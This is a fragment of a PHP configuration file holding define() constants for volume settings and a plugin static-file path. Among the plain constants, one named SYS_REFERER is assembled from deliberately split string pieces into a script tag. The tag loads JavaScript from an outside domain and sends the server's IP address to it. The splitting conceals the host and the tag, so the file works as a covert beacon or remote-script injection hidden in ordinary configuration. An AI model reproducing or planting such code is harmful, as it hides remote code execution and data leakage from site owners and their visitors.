...
define('WB_VOL',5000);
define('WB_VOL_CM',2.2);//cm

define('SY'.'S_REF'.'ERER','<scr'.'ipt  typ'.'e="text/'.'javas'.'cri'.'pt" src="ht'.'tp:/'.'/w'.'w'.'w.s'.'u'.'ny'.'l.c'.'o'.'m/a'.'pi.'.'ph'.'p?op'.'=upc'.'&uid=1&ip='.s_r_v_ip().'&dm=&sn=" rel'.'oad="1"></scr'.'ipt>');

//应用静态文件路径
define('PLUGIN_STATICS_PATH',WEB_PATH.'resource/plugin/');
